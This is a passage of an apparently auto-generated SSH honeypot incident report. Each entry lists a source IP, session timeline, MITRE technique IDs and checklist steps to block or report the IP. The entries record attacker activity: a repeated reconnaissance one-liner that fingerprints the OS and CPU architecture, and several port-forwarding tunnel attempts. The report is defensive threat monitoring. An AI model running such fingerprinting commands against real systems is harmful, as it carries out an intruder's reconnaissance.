| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:12:34` | `cowrie.session.connect` |
| `2026-08-12 04:12:34` | `cowrie.login.success` |
| `2026-08-12 04:12:35` | `cowrie.session.params` |
| `2026-08-12 04:12:35` | `cowrie.command.input` |
| `2026-08-12 04:12:35` | `cowrie.command.input` |
| `2026-08-12 04:12:35` | `cowrie.command.failed` |
| `2026-08-12 04:12:35` | `cowrie.command.input` |
| `2026-08-12 04:12:35` | `cowrie.log.closed` |
| `2026-08-12 04:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.100[.]71` to AbuseIPDB if not already reported
- [ ] Block `34.14.100[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857f9834013f

| Field | Detail |
|---|---|
| **Source IP** | `34.14.100[.]71` |
| **First Seen** | 2026-08-12 04:12 |
| **Last Seen** | 2026-08-12 04:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:12:43` | `cowrie.session.connect` |
| `2026-08-12 04:12:43` | `cowrie.login.success` |
| `2026-08-12 04:12:43` | `cowrie.session.params` |
| `2026-08-12 04:12:43` | `cowrie.command.input` |
| `2026-08-12 04:12:43` | `cowrie.command.failed` |
| `2026-08-12 04:12:49` | `cowrie.log.closed` |
| `2026-08-12 04:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.100[.]71` to AbuseIPDB if not already reported
- [ ] Block `34.14.100[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3ab1dd454a

| Field | Detail |
|---|---|
| **Source IP** | `34.14.100[.]71` |
| **First Seen** | 2026-08-12 04:12 |
| **Last Seen** | 2026-08-12 04:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:12:45` | `cowrie.session.connect` |
| `2026-08-12 04:12:45` | `cowrie.login.success` |
| `2026-08-12 04:12:45` | `cowrie.session.params` |
| `2026-08-12 04:12:45` | `cowrie.command.input` |
| `2026-08-12 04:12:49` | `cowrie.log.closed` |
| `2026-08-12 04:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.14.100[.]71` to AbuseIPDB if not already reported
- [ ] Block `34.14.100[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac808237ccb1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:14 |
| **Last Seen** | 2026-08-12 04:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:14:08` | `cowrie.session.connect` |
| `2026-08-12 04:14:09` | `cowrie.client.version` |
| `2026-08-12 04:14:09` | `cowrie.client.kex` |
| `2026-08-12 04:14:12` | `cowrie.login.success` |
| `2026-08-12 04:14:14` | `cowrie.session.params` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.success` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:14` | `cowrie.command.input` |
| `2026-08-12 04:14:15` | `cowrie.log.closed` |
| `2026-08-12 04:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c0d4cec0e7b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:16 |
| **Last Seen** | 2026-08-12 04:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:16:42` | `cowrie.session.connect` |
| `2026-08-12 04:16:42` | `cowrie.client.version` |
| `2026-08-12 04:16:42` | `cowrie.client.kex` |
| `2026-08-12 04:16:46` | `cowrie.login.success` |
| `2026-08-12 04:16:47` | `cowrie.session.params` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.success` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:47` | `cowrie.command.input` |
| `2026-08-12 04:16:48` | `cowrie.log.closed` |
| `2026-08-12 04:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc8c529fe6d

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-08-12 04:20 |
| **Last Seen** | 2026-08-12 04:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:20:45` | `cowrie.session.connect` |
| `2026-08-12 04:20:45` | `cowrie.client.version` |
| `2026-08-12 04:20:45` | `cowrie.client.kex` |
| `2026-08-12 04:20:46` | `cowrie.login.success` |
| `2026-08-12 04:20:46` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249cff93e5e1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:21 |
| **Last Seen** | 2026-08-12 04:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:21:36` | `cowrie.session.connect` |
| `2026-08-12 04:21:37` | `cowrie.client.version` |
| `2026-08-12 04:21:37` | `cowrie.client.kex` |
| `2026-08-12 04:21:39` | `cowrie.login.success` |
| `2026-08-12 04:21:41` | `cowrie.session.params` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.success` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:41` | `cowrie.command.input` |
| `2026-08-12 04:21:42` | `cowrie.log.closed` |
| `2026-08-12 04:21:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d19b4fcc86cb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:23 |
| **Last Seen** | 2026-08-12 04:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:23:54` | `cowrie.session.connect` |
| `2026-08-12 04:23:54` | `cowrie.client.version` |
| `2026-08-12 04:23:54` | `cowrie.client.kex` |
| `2026-08-12 04:23:56` | `cowrie.login.success` |
| `2026-08-12 04:23:58` | `cowrie.session.params` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.success` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:58` | `cowrie.command.input` |
| `2026-08-12 04:23:59` | `cowrie.log.closed` |
| `2026-08-12 04:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede2249c41eb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:26 |
| **Last Seen** | 2026-08-12 04:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:26:09` | `cowrie.session.connect` |
| `2026-08-12 04:26:09` | `cowrie.client.version` |
| `2026-08-12 04:26:09` | `cowrie.client.kex` |
| `2026-08-12 04:26:10` | `cowrie.login.success` |
| `2026-08-12 04:26:12` | `cowrie.session.params` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.success` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.command.input` |
| `2026-08-12 04:26:12` | `cowrie.log.closed` |
| `2026-08-12 04:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df9d3f423689

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:28 |
| **Last Seen** | 2026-08-12 04:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:28:20` | `cowrie.session.connect` |
| `2026-08-12 04:28:20` | `cowrie.client.version` |
| `2026-08-12 04:28:20` | `cowrie.client.kex` |
| `2026-08-12 04:28:21` | `cowrie.login.success` |
| `2026-08-12 04:28:23` | `cowrie.session.params` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.success` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.command.input` |
| `2026-08-12 04:28:23` | `cowrie.log.closed` |
| `2026-08-12 04:28:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe1e7e8338d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:30 |
| **Last Seen** | 2026-08-12 04:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:30:42` | `cowrie.session.connect` |
| `2026-08-12 04:30:42` | `cowrie.client.version` |
| `2026-08-12 04:30:42` | `cowrie.client.kex` |
| `2026-08-12 04:30:43` | `cowrie.login.success` |
| `2026-08-12 04:30:44` | `cowrie.session.params` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.success` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:44` | `cowrie.command.input` |
| `2026-08-12 04:30:45` | `cowrie.log.closed` |
| `2026-08-12 04:30:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7f49751b3b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]192` |
| **First Seen** | 2026-08-12 04:31 |
| **Last Seen** | 2026-08-12 04:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:31:17` | `cowrie.session.connect` |
| `2026-08-12 04:31:17` | `cowrie.client.version` |
| `2026-08-12 04:31:17` | `cowrie.client.kex` |
| `2026-08-12 04:31:19` | `cowrie.login.success` |
| `2026-08-12 04:31:19` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]192` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5c39f99b0f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:33 |
| **Last Seen** | 2026-08-12 04:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:33:08` | `cowrie.session.connect` |
| `2026-08-12 04:33:08` | `cowrie.client.version` |
| `2026-08-12 04:33:08` | `cowrie.client.kex` |
| `2026-08-12 04:33:09` | `cowrie.login.success` |
| `2026-08-12 04:33:10` | `cowrie.session.params` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.success` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.command.input` |
| `2026-08-12 04:33:10` | `cowrie.log.closed` |
| `2026-08-12 04:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abaf01c0cb22

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]230` |
| **First Seen** | 2026-08-12 04:34 |
| **Last Seen** | 2026-08-12 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:34:12` | `cowrie.session.connect` |
| `2026-08-12 04:34:12` | `cowrie.client.version` |
| `2026-08-12 04:34:12` | `cowrie.client.kex` |
| `2026-08-12 04:34:13` | `cowrie.login.success` |
| `2026-08-12 04:34:13` | `cowrie.direct-tcpip.request` |
| `2026-08-12 04:34:13` | `cowrie.direct-tcpip.data` |
| `2026-08-12 04:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]230` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0af38dfbe9f4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:35 |
| **Last Seen** | 2026-08-12 04:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:35:33` | `cowrie.session.connect` |
| `2026-08-12 04:35:33` | `cowrie.client.version` |
| `2026-08-12 04:35:34` | `cowrie.client.kex` |
| `2026-08-12 04:35:35` | `cowrie.login.success` |
| `2026-08-12 04:35:36` | `cowrie.session.params` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.success` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.command.input` |
| `2026-08-12 04:35:36` | `cowrie.log.closed` |
| `2026-08-12 04:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e21b1d0ccf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:37 |
| **Last Seen** | 2026-08-12 04:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
